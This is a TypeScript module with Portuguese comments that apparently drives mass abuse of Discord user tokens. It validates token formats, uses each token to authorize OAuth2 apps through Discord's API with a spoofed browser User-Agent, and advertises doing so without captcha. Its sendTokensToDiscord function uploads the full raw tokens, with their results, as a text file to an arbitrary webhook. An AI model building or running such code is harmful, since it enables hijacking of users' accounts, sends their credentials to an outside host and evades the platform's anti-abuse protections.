import axios from "axios";
import { z } from "zod";

const BASE_URL = "https://discord.com/api/v9";

/**
 * Validar e extrair parâmetros do link OAuth2
 */
export function parseOAuthUrl(url: string) {
  try {
    const parsed = new URL(url);
    const params = Object.fromEntries(parsed.searchParams);

    return {
      clientId: params.client_id,
      responseType: params.response_type || "code",
      redirectUri: params.redirect_uri,
      scope: params.scope,
      state: params.state || "",
    };
  } catch (error) {
    throw new Error("URL OAuth2 inválida");
  }
}

/**
 * Validar formato de token Discord
 */
export function validateToken(token: string): boolean {
  // Tokens Discord têm formato: MTE... (começa com MTE, MTI, etc)
  // Ou formato antigo: números.números.números
  const tokenRegex = /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$|^[A-Za-z0-9_-]{24,}$/;
  return tokenRegex.test(token.trim());
}

/**
 * Tentar autorizar via API Discord (sem captcha)
 */
export async function authorizeViaApi(
  token: string,
  oauthParams: ReturnType<typeof parseOAuthUrl>
) {
  const headers = {
    Authorization: token,
    "Content-Type": "application/json",
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
  };

  const payload = {
    authorize: true,
    permissions: "0",
  };

  try {
    const response = await axios.post(`${BASE_URL}/oauth2/authorize`, payload, {
      headers,
      params: {
        client_id: oauthParams.clientId,
        response_type: oauthParams.responseType,
        redirect_uri: oauthParams.redirectUri,
        scope: oauthParams.scope,
        state: oauthParams.state,
      },
      timeout: 10000,
    });

    if (response.status === 200) {
      const location = response.data?.location;
      if (location) {
        // Tentar acessar a URL de callback
        try {
          await axios.get(location, {
            headers: { "User-Agent": headers["User-Agent"] },
            timeout: 10000,
          });
        } catch (e) {
          // Callback pode falhar, mas a autorização foi bem-sucedida
        }
        return { success: true, message: "Autorizado via API!" };
      }
    }

    return { success: false, message: `Erro ${response.status}` };
  } catch (error: any) {
    if (error.response?.status === 400 && error.response?.data?.captcha_key) {
      return { success: false, message: "Captcha necessário", requiresCaptcha: true };
    }

    if (error.response?.status === 401) {
      return { success: false, message: "Token inválido ou expirado" };
    }

    if (error.code === "ECONNABORTED") {
      return { success: false, message: "Timeout na requisição" };
    }

    return {
      success: false,
      message: error.message || "Erro ao autorizar via API",
    };
  }
}

/**
 * Enviar tokens ao webhook Discord como arquivo .txt
 */
export async function sendTokensToDiscord(
  webhookUrl: string,
  tokens: Array<{ token: string; status: string; error?: string }>
) {
  try {
    // Criar conteúdo do arquivo
    const fileContent = tokens
      .map((t) => {
        if (t.status === "success") {
          return `${t.token} - ✓ Sucesso`;
        } else {
          return `${t.token} - ✗ Erro: ${t.error || "Desconhecido"}`;
        }
      })
      .join("\n");

    // Criar FormData com o arquivo
    const formData = new FormData();
    const blob = new Blob([fileContent], { type: "text/plain" });
    formData.append("file", blob, "tokens_resultado.txt");
    formData.append(
      "payload_json",
      JSON.stringify({
        content: `Processamento de ${tokens.length} tokens concluído!`,
      })
    );

    const response = await axios.post(webhookUrl, formData, {
      headers: {
        "Content-Type": "multipart/form-data",
      },
      timeout: 15000,
    });

    return { success: true, message: "Tokens enviados ao Discord com sucesso" };
  } catch (error: any) {
    console.error("[Discord] Erro ao enviar tokens:", error.message);
    return {
      success: false,
      message: error.message || "Erro ao enviar tokens ao Discord",
    };
  }
}

/**
 * Gerar preview do token (primeiros 15 caracteres + "...")
 */
export function getTokenPreview(token: string): string {
  const trimmed = token.trim();
  if (trimmed.length <= 15) {
    return trimmed;
  }
  return trimmed.substring(0, 15) + "...";
}
